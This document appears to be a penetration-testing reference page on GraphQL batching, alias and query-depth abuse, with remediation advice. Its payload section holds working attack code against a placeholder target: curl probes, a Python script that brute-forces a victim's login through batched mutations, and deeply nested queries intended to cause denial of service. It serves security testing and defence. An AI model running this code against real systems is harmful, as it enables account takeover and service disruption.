# GraphQL Batching / Query Depth Abuse

## Overview
GraphQL allows clients to batch multiple operations in a single request (batched queries) and to create deeply nested queries that cause exponential resolver execution. Without query complexity limits and depth restrictions, attackers can bypass rate limiting by stuffing many queries into one request, or craft a deeply nested query that causes DoS through exponential database load.

## How It Works
- **Batching abuse**: GraphQL accepts an array of query objects. An attacker sends 1000 login queries in a single HTTP request, bypassing rate limiting that counts requests (not operations).
- **Deep query nesting**: In a social network, `user → friends → friends → friends → friends → posts` may recursively execute hundreds of database queries.
- **Alias abuse**: Using different aliases for the same expensive query in one request: `q1: expensiveQuery(id:1) q2: expensiveQuery(id:2) ...`.
- **Introspection + batching**: Combine schema introspection with batch queries for comprehensive enumeration.

## Impact
- Rate limit bypass: brute-force authentication via 1000 login attempts in 1 HTTP request.
- DoS via resource exhaustion from deeply nested queries.
- OTP/MFA brute force bypassing per-request rate limits.
- Credential stuffing at massive scale with minimal HTTP connections.

## Where to Look
- Any GraphQL endpoint (`/graphql`, `/api/graphql`, `/gql`).
- Authentication mutations that accept username/password.
- Endpoints with recursive or nested object relationships.

## Testing Steps
1. Try sending a batched array of queries in a single request.
2. If accepted, test with 100 login attempts in one batch request.
3. Test query depth: nest objects 10 levels deep and observe server response time.
4. Test alias-based parallel queries: same expensive query with multiple aliases.
5. Check if the server has query complexity or depth limits.
6. Measure response time difference between 1 query and 100 batched queries.

## Payloads / Techniques
```bash
# Test if batching is supported
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "{ __typename }"},
    {"query": "{ __typename }"}
  ]' | python3 -m json.tool
# If response is an array → batching is supported

# Batch brute force login (100 attempts in 1 HTTP request)
python3 - << 'EOF'
import requests, json

ENDPOINT = "https://target.com/graphql"
TARGET_EMAIL = "victim@target.com"
passwords = ["password1", "123456", "letmein", "admin", "password"]  # expand as needed

batch = []
for i, pwd in enumerate(passwords):
    batch.append({
        "operationName": f"login{i}",
        "query": f"""mutation login{i} {{
          login(email: "{TARGET_EMAIL}", password: "{pwd}") {{
            token
            user {{ id email }}
          }}
        }}"""
    })

r = requests.post(ENDPOINT,
    headers={"Content-Type": "application/json"},
    json=batch)
results = r.json()
for i, result in enumerate(results):
    if not result.get('errors'):
        print(f"SUCCESS with password: {passwords[i]}")
        print(result)
EOF

# Deep query nesting test (DoS potential)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { friends { friends { friends { friends { friends { id name }}}}}}}"}'

# Alias abuse (many queries in one request)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ q1: user(id:1){id} q2: user(id:2){id} q3: user(id:3){id} q4: user(id:4){id} }"}'
```

## Burp Suite Tips
- **InQL** (BApp Store) has built-in batch attack generation capabilities.
- In **Repeater**, manually construct batch arrays and test for rate limit bypass.
- Use **Turbo Intruder** to send batch requests at high speed.
- Monitor response size and timing for DoS indicators.

## Tools
- InQL (Burp BApp) — GraphQL testing including batch attacks
- GraphQL Cop — https://github.com/nicholasess/graphql-cop (automated security checks)
- Custom Python scripts for batch crafting

## Remediation
- Disable query batching if not required by the application.
- If batching is needed, limit batch size (e.g., max 10 operations per batch).
- Implement query depth limits: reject queries nested deeper than N levels.
- Implement query complexity analysis: assign a cost to each field resolver, reject queries exceeding a complexity budget.
- Implement rate limiting per operation within a batch, not just per HTTP request.
- Use `graphql-depth-limit`, `graphql-cost-analysis`, or built-in directives in Apollo Server.

## References
https://portswigger.net/web-security/graphql
https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
https://owasp.org/www-project-api-security/
https://lab.wallarm.com/graphql-batching-attack/
